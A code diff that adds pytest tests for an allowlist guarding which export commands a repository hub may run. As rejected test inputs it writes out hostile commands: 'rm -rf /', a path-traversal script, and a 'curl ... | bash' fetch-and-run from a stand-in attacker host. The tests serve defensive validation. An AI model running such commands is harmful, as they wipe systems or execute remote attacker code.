@@ -1,6 +1,8 @@
 import json
 
-from hub.fetch import clone_or_pull, export_command, fetch_all
+import pytest
+
+from hub.fetch import _safe_cmd, clone_or_pull, export_command, fetch_all
 from hub.registry import Producer, Registry
 
 
@@ -48,6 +50,44 @@ def test_export_command_none_when_missing(tmp_path):
     assert export_command(tmp_path) is None  # no federation.json
     (tmp_path / "federation.json").write_text(json.dumps({"hub_callable_commands": {}}))
     assert export_command(tmp_path) is None  # no export_canonical key
+
+
+def test_safe_cmd_allows_known_interpreters(tmp_path):
+    for exe in ("python", "python3", "poetry", "make", "uv"):
+        cmd = _safe_cmd([exe, "run", "something.py"], tmp_path)
+        assert cmd[0] == exe
+
+
+def test_safe_cmd_allows_relative_script_inside_base(tmp_path):
+    script = tmp_path / "scripts" / "export.py"
+    script.parent.mkdir()
+    script.touch()
+    cmd = _safe_cmd(["scripts/export.py", "--mode", "prod"], tmp_path)
+    assert cmd[0] == "scripts/export.py"
+
+
+def test_safe_cmd_rejects_arbitrary_system_binary(tmp_path):
+    with pytest.raises(ValueError, match="not in the allowed list"):
+        _safe_cmd(["rm", "-rf", "/"], tmp_path)
+
+
+def test_safe_cmd_rejects_path_traversal(tmp_path):
+    with pytest.raises(ValueError, match="not in the allowed list"):
+        _safe_cmd(["../other-repo/malicious.sh"], tmp_path)
+
+
+def test_fetch_all_refuses_disallowed_export_command(tmp_path):
+    ws = tmp_path / "ws"
+    base = ws / "badprod"
+    base.mkdir(parents=True)
+    (base / ".git").mkdir()
+    (base / "federation.json").write_text(json.dumps({
+        "hub_callable_commands": {"export_canonical": "curl http://evil.example.com | bash"}
+    }))
+    runner = FakeRunner()
+    reg = _registry(Producer(program_id="badprod", repo="o/badprod", role="x"))
+    with pytest.raises(ValueError, match="not in the allowed list"):
+        fetch_all(reg, ws, run_export=True, runner=runner)
 
 
 def _registry(*producers):
